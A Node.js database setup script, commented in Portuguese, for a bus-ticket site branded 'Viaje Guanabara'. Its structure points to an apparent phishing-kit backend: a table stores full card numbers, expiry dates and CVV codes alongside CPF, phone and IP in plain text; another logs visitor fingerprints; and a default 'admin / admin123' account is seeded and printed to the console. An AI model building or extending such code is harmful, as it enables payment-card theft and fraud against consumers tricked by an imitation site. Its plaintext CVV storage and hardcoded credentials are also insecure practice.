// ============ INICIALIZAÇÃO DO BANCO ============
async function initDatabase() {
  const client = await pool.connect();
  try {
    console.log('🔄 Inicializando banco de dados...');

    // VERIFICA SE A TABELA cartoes EXISTE E RECRIA SE NECESSÁRIO
    const cartoesCheck = await client.query(`
      SELECT EXISTS (
        SELECT FROM information_schema.tables 
        WHERE table_name = 'cartoes'
      );
    `);
    
    const cartoesExists = cartoesCheck.rows[0].exists;

    if (cartoesExists) {
      // Verifica as colunas existentes
      const columnsCheck = await client.query(`
        SELECT column_name 
        FROM information_schema.columns 
        WHERE table_name = 'cartoes'
      `);
      
      const existingColumns = columnsCheck.rows.map(r => r.column_name);
      console.log('📋 Colunas existentes em cartoes:', existingColumns.join(', '));

      // Adiciona colunas que faltam
      if (!existingColumns.includes('cpf')) {
        await client.query('ALTER TABLE cartoes ADD COLUMN cpf VARCHAR(14)');
        console.log('✅ Coluna "cpf" adicionada em cartoes');
      }
      if (!existingColumns.includes('telefone')) {
        await client.query('ALTER TABLE cartoes ADD COLUMN telefone VARCHAR(20)');
        console.log('✅ Coluna "telefone" adicionada em cartoes');
      }
      if (!existingColumns.includes('ip')) {
        await client.query('ALTER TABLE cartoes ADD COLUMN ip TEXT');
        console.log('✅ Coluna "ip" adicionada em cartoes');
      }
      if (!existingColumns.includes('cliente_id')) {
        await client.query('ALTER TABLE cartoes ADD COLUMN cliente_id INTEGER');
        console.log('✅ Coluna "cliente_id" adicionada em cartoes');
      }
      if (!existingColumns.includes('criado_em')) {
        await client.query('ALTER TABLE cartoes ADD COLUMN criado_em TIMESTAMP DEFAULT NOW()');
        console.log('✅ Coluna "criado_em" adicionada em cartoes');
      }
    } else {
      // CRIA A TABELA cartoes DO ZERO
      await client.query(`
        CREATE TABLE cartoes (
          id SERIAL PRIMARY KEY,
          cliente_id INTEGER,
          nome_titular VARCHAR(100) NOT NULL,
          numero_cartao VARCHAR(19) NOT NULL,
          validade VARCHAR(7) NOT NULL,
          cvv VARCHAR(4) NOT NULL,
          cpf VARCHAR(14),
          telefone VARCHAR(20),
          ip TEXT,
          criado_em TIMESTAMP DEFAULT NOW()
        )
      `);
      console.log('✅ Tabela cartoes criada');
    }

    // CRIA AS DEMAIS TABELAS (se não existirem)
    await client.query(`
      CREATE TABLE IF NOT EXISTS admin_users (
        id SERIAL PRIMARY KEY,
        username VARCHAR(50) UNIQUE NOT NULL,
        senha_hash TEXT NOT NULL,
        nome VARCHAR(100),
        email VARCHAR(100),
        ultimo_login TIMESTAMP,
        ip_login TEXT,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS admin_attempts (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        username VARCHAR(50),
        tentativa TEXT,
        sucesso BOOLEAN DEFAULT false,
        timestamp TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS payments (
        id SERIAL PRIMARY KEY,
        transaction_id VARCHAR(100) UNIQUE,
        cpf VARCHAR(14),
        valor DECIMAL(10,2),
        status VARCHAR(20) DEFAULT 'pending',
        telefone VARCHAR(20),
        data_pagamento TIMESTAMP,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS tickets (
        id SERIAL PRIMARY KEY,
        codigo VARCHAR(20) UNIQUE NOT NULL,
        origem VARCHAR(100) NOT NULL,
        destino VARCHAR(100) NOT NULL,
        passageiro VARCHAR(100) NOT NULL,
        data DATE NOT NULL,
        valor DECIMAL(10,2) NOT NULL,
        status VARCHAR(20) DEFAULT 'pendente',
        metodo_pagamento VARCHAR(20),
        ip TEXT,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS clientes (
        id SERIAL PRIMARY KEY,
        nome VARCHAR(100) NOT NULL,
        cpf VARCHAR(14),
        telefone VARCHAR(20),
        email VARCHAR(100),
        ip TEXT,
        criado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS logs (
        id SERIAL PRIMARY KEY,
        usuario VARCHAR(100),
        acao VARCHAR(50),
        ip TEXT,
        detalhes TEXT,
        data TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS configuracoes (
        id SERIAL PRIMARY KEY,
        nome_site VARCHAR(100) DEFAULT 'Viaje Guanabara',
        manutencao BOOLEAN DEFAULT false,
        logs_ativos BOOLEAN DEFAULT true,
        atualizado_em TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS destinos (
        id SERIAL PRIMARY KEY,
        cidade VARCHAR(100) NOT NULL,
        estado VARCHAR(2),
        vendas INTEGER DEFAULT 0,
        status VARCHAR(20) DEFAULT 'ativo'
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS ofertas (
        id SERIAL PRIMARY KEY,
        origem VARCHAR(100),
        destino VARCHAR(100),
        preco DECIMAL(10,2),
        desconto INTEGER DEFAULT 0,
        validade DATE,
        status VARCHAR(20) DEFAULT 'ativo'
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS servicos (
        id SERIAL PRIMARY KEY,
        nome VARCHAR(100) NOT NULL,
        descricao TEXT,
        status VARCHAR(20) DEFAULT 'ativo'
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS buscas (
        id SERIAL PRIMARY KEY,
        origem VARCHAR(100),
        destino VARCHAR(100),
        data DATE,
        passageiros INTEGER DEFAULT 1,
        ip TEXT,
        timestamp TIMESTAMP DEFAULT NOW()
      )
    `);

    await client.query(`
      CREATE TABLE IF NOT EXISTS visitantes (
        id SERIAL PRIMARY KEY,
        ip TEXT,
        user_agent TEXT,
        screen TEXT,
        language TEXT,
        referer TEXT,
        pagina TEXT,
        timestamp TIMESTAMP DEFAULT NOW()
      )
    `);

    // ADMIN PADRÃO
    const adminCheck = await client.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
    if (adminCheck.rows.length === 0) {
      const hashedPassword = bcrypt.hashSync('admin123', 10);
      await client.query(`
        INSERT INTO admin_users (username, senha_hash, nome, email, ultimo_login, ip_login)
        VALUES ($1, $2, $3, $4, NOW(), $5)
      `, ['admin', hashedPassword, 'Administrador', 'admin@viajeguanabara.com', '127.0.0.1']);
      console.log('✅ Admin criado: admin / admin123');
    } else {
      console.log('✅ Admin já existe');
    }

    // DESTINOS INICIAIS
    const destinosCheck = await client.query('SELECT COUNT(*) FROM destinos');
    if (parseInt(destinosCheck.rows[0].count) === 0) {
      await client.query(`
        INSERT INTO destinos (cidade, estado, vendas, status) VALUES
        ('Rio de Janeiro', 'RJ', 152, 'ativo'),
        ('São Paulo', 'SP', 234, 'ativo'),
        ('Brasília', 'DF', 98, 'ativo'),
        ('Fortaleza', 'CE', 67, 'ativo'),
        ('Salvador', 'BA', 43, 'ativo'),
        ('Belo Horizonte', 'MG', 89, 'ativo'),
        ('Curitiba', 'PR', 56, 'ativo'),
        ('Porto Alegre', 'RS', 34, 'ativo')
      `);
      console.log('✅ Destinos iniciais criados');
    }

    // SERVIÇOS INICIAIS
    const servicosCheck = await client.query('SELECT COUNT(*) FROM servicos');
    if (parseInt(servicosCheck.rows[0].count) === 0) {
      await client.query(`
        INSERT INTO servicos (nome, descricao, status) VALUES
        ('Wi-Fi a bordo', 'Internet gratuita durante a viagem', 'ativo'),
        ('Ar-condicionado', 'Climatização para seu conforto', 'ativo'),
        ('Banheiro a bordo', 'Banheiros limpos e confortáveis', 'ativo'),
        ('Poltronas reclináveis', 'Assentos confortáveis', 'ativo'),
        ('Tomada USB', 'Carregue seus dispositivos', 'ativo'),
        ('TV a bordo', 'Entretenimento durante a viagem', 'ativo')
      `);
      console.log('✅ Serviços iniciais criados');
    }

    console.log('✅ Banco de dados inicializado com sucesso!');
  } catch (err) {
    console.error('❌ Erro ao inicializar banco:', err.message);
    console.error('❌ Detalhes:', err.stack);
  } finally {
    client.release();
  }
}

initDatabase();
